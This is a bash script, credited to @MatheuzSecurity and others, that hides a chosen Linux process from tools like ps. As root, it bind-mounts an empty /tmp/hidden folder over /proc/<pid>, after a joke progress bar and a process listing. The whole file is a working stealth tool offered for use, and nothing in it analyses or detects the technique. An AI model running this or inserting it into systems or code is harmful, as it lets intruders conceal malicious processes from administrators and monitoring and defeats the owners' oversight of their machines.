#!/usr/bin/env bash
# A simple script to hide a process
# Created by @MatheuzSecurity
# https://twitter.com/inferigang
#
# Modified by LV6LV and probably others. 
#

# Aux Function
function ProgressBar {
# Process data
	let _progress=(${1}*100/${2}*100)/100
	let _done=(${_progress}*4)/10
	let _left=40-$_done
# Build progressbar string lengths
	_done=$(printf "%${_done}s")
	_left=$(printf "%${_left}s")

# 1.2 Build progressbar strings and print the ProgressBar line
# 1.2.1 Output example:
# 1.2.1.1 Progress : [########################################] 100%
printf "\r${YELLOW}Thinking(not really): ${NORM}[${_done// /#}${_left// /-}] ${_progress}%%"

}
# Variables for ProgressBar
_start=1
# This accounts as the "totalState" variable for the ProgressBar function
_end=100

# Main Functions
function mkFolder() {
        rm -rf /tmp/hidden
        mkdir /tmp/hidden
        if [[ $? -ne 0 ]]; then
                printf "\n[error] An error has ocurred\n\n" >&2
                exit 1
        fi
}
function hideProcess() {
        mount --bind /tmp/hidden /proc/$pid
}
function listProcess() {
        ps -efa -o ppid,pid,tty,comm
}
function currentProcinfo() {
	printf "\n\nCurrent Process Info\n\n"
	printf "PPID=$PPID PID=$$ TTY=";tty
}

if [[ $(id -u) -ne "0" ]]; then
        printf "\n[error] You must run this script as root\n\n" >&2
        exit 1
fi

for number in $(seq ${_start} ${_end})
do
        sleep 0.01 # This changes the speed of the bar
        ProgressBar ${number} ${_end}
done

currentProcinfo
printf "\nSimple Process List\n\n"
listProcess
printf "\r\n"
read -p "Process ID to hide: " pid

mesg="Your PID was successfully hidden!"

mkFolder && hideProcess && \

for i in $(seq 1 ${#mesg}); do
        printf "${mesg:i-1:1}"
        sleep 0.022
done
printf "\n\n"
